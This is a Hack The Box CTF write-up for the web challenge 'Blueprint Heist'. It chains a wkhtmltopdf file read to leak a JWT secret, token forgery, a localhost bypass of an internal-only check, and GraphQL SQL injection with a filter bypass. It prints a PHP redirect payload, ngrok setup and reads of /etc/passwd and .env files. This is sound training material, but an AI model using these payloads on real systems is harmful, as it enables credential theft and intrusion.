
---

# 🐧 Penguin's Offensive Security — HTB CTF Writeup

## Challenge Name: Blueprint Heist  
**Platform:** Hack The Box  
**Category:** Web  
**Difficulty:** Medium  
**Exploit Type:** Vulnerability Chaining

* Programming (JavaScript, EJS, SQL)
* Understanding of JWT Tokens
* Identification and exploitation of known vulnerable software
* Vulnerability chaining

---

### 📖 Description

Greetings and welcome to the world of **Penguin's Offensive Security**!

This repository contains the write-up for the Hack The Box CTF challenge titled **Blueprint Heist**. This is a medium-level, web-based challenge.

---

## 🕳️ Vulnerabilities Exploited

* `wkhtmltopdf` v0.12.5 (RCE)
* Local File Inclusion (LFI) to expose JWT secret
* SQL Injection (SQLi) to write files
* Misconfigured JWT validation logic

---

## 🌐 Website Overview

![Image1](/imgs/1.png)
The landing page contains two links.

Inspecting the source code (not fully discussed here due to length):

![Image2](/imgs/2.png)
The `authcontroller` checks only for the `admin` value in the JWT token — no additional checks.

![Image3](/imgs/3.png)
In `/app/.env`, the **JWT secret key** is exposed. Also note:

* The **database user is `root`**, which has full write permissions — critical for later RCE.
* This can eventually lead to **remote code execution**.

---

## ⚙️ Exploitation Process

### 🔎 Initial Recon

Clicking the first link and observing with Burp Suite reveals the following routes:

1. `/getToken` – Generates a **guest JWT token**
2. `/download?token=xyz` – Downloads a PDF using the provided token

![Image4](/imgs/4.png)
Sending request 2 to Repeater shows an error after some time — this error leaks the `wkhtmltopdf` version.

---

## 🚀 Exploiting wkhtmltopdf

Searching for the exploit online leads to an RCE vulnerability.

### Exploit Setup

```bash
# Step 1: Navigate to your web directory
cd /var/www/html

# Step 2: Create an exploit file
nano exp.php
# Paste the following payload:
# <?php header('location:file://'.$_REQUEST['x']); ?>

# Step 3: Save and close (Ctrl + O, then Ctrl + X)

# Step 4: Start a PHP server
php -S 0.0.0.0:8000

# Step 5: Start ngrok to expose local server
ngrok tcp 8000
```

### Exploitation Steps

* Replace `tcp://` with `http://` in the ngrok URL, e.g.:
  `http://<your-ngrok-url>/exp.php?x=/etc/passwd`

![Image5](/imgs/5.png)
Access this URL via the `url` parameter in `/download`. You’ll get a 200 OK response with a PDF showing the file contents.

![Image6](/imgs/6.png)
Now use this method to read `/app/.env`:

![Image7](/imgs/7.png)
You'll extract the **JWT secret key** here (hidden to let you try it).

---

## 🔐 JWT Token Forgery

With the secret key:

1. Visit [jwt.io](https://jwt.io/)
2. Paste your guest token and the secret key
3. Modify the payload to `"role": "admin"`
4. Copy the newly signed token

![Image8](/imgs/8.png)

---

## 🧱 Bypassing Internal-Only Access

Accessing `http://challenge-url:1337/admin?token=admin-token` throws an **"Only For Internal Users"** error.

Code snippet from `/app/utils/security.js`:

```js
function checkInternal(req) {
    const address = req.socket.remoteAddress.replace(/^.*:/, '');
    return address === "127.0.0.1";
}
```

### 💡 Solution

Modify the `url` parameter to:

```
http://localhost:<port>/admin?token=admin-token-here
```

![Image9](/imgs/9.png)
![Image10](/imgs/10.png)

This will return a downloadable HTMLtoPDF file with a `username` parameter which we will use to test SQLi.
![Image10=1](/imgs/11.png)

---

## 🧬 SQL Injection to RCE & Flag Retrieval

Now access `/graphql` using:

* `token` (admin JWT)
* `query` (GraphQL injection payload)

### 🔥 Regex-Based Filter Bypass

The following function tries to detect SQLi:

```js
function detectSqli(query) {
    const pattern = /^.*[!#$%^&*()\-_=+{}\[\]\\|;:'",.<>\/?]/;
    return pattern.test(query);
}
```

To bypass, use escape sequences:

```graphql
"a\u000d\u000a"
```

### 🔓 Payload Format

```graphql
{
  getDataByName(name:"<injection here>") {
    name
    department
    isPresent
  }
}
```

Try:

* `ORDER BY` or `GROUP BY` to determine column count
* `UNION SELECT` to find injectable columns
* `INTO OUTFILE` to write data into known error logs

![Image12](/imgs/12.png)
![Image13](/imgs/13.png)

---

## 🏁 Conclusion

After chaining LFI, JWT manipulation, internal access bypass, and SQLi with file write, you should be able to read the final flag.

**Congratulations — you captured the flag! 🎉**

---

